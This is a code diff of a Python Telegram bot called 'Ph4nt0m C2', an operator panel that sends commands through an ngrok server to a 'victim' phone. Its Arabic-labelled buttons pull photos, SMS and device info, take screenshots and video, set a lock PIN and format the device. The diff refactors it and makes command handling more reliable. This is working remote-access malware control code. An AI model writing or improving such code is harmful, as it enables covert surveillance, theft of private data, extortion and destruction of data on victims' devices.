@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Ph4nt0m C2 Bot - Direct Control
+Ph4nt0m C2 Bot - WebSocket Control
 """
 import os, json, requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -11,21 +11,19 @@ SERVER_URL = "https://d932-2001-16a4-2f8-adf9-ac8c-c4ff-fef6-f51.ngrok-free.app"
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
 ASK_PIN, ASK_NOTIFY = 1, 2
-current_victim = None
 
 def send_command(action, params=None):
     """إرسال أمر إلى السيرفر"""
     try:
         res = requests.post(f"{SERVER_URL}/command", json={
-            "victimId": "target",
             "action": action,
             "params": params or {}
-        })
+        }, timeout=5)
         return res.json()
     except Exception as e:
         return {"status": "error", "message": str(e)}
 
-def ckbd():
+def control_keyboard():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("📷 فحص الصور", callback_data='scan_photos'),
          InlineKeyboardButton("📋 معلومات الجهاز", callback_data='get_info')],
@@ -37,12 +35,12 @@ def ckbd():
          InlineKeyboardButton("💡 فلاش OFF", callback_data='flash_off')],
         [InlineKeyboardButton("💬 سحب SMS", callback_data='get_sms')],
         [InlineKeyboardButton("🔔 إشعار", callback_data='send_notify'),
-         InlineKeyboardButton("🔒 قفل", callback_data='set_pin')],
+         InlineKeyboardButton("🔒 قفل برمز", callback_data='set_pin')],
         [InlineKeyboardButton("💣 فرمتة", callback_data='format')]
     ])
 
 async def start(update, context):
-    await update.message.reply_text("⚡ Ph4nt0m C2", reply_markup=ckbd())
+    await update.message.reply_text("⚡ **Ph4nt0m C2**\nاختر أمراً:", reply_markup=control_keyboard())
 
 async def handle(update, context):
     q = update.callback_query
@@ -56,14 +54,14 @@ async def handle(update, context):
         await q.edit_message_text("🔔 أرسل نص الإشعار:")
         return ASK_NOTIFY
 
-    if d in ('scan_photos', 'get_info', 'get_sms'):
-        result = send_command(d)
-        await q.edit_message_text(f"✅ تم: {d}\n{result}", reply_markup=ckbd())
-    elif d in ('vibrate', 'play_sound', 'screenshot', 'record_video', 'flash_on', 'flash_off', 'format'):
-        result = send_command(d)
-        await q.edit_message_text(f"✅ تم: {d}\n{result}", reply_markup=ckbd())
+    result = send_command(d)
+    status = result.get('status', 'error')
+    msg = result.get('message', '')
+    
+    if status == 'ok':
+        await q.edit_message_text(f"✅ تم تنفيذ: {d}", reply_markup=control_keyboard())
     else:
-        await q.edit_message_text("اختر أمر:", reply_markup=ckbd())
+        await q.edit_message_text(f"❌ فشل: {msg}\nتأكد أن الضحية متصل.", reply_markup=control_keyboard())
 
 async def pin_input(update, context):
     pin = update.message.text.strip()
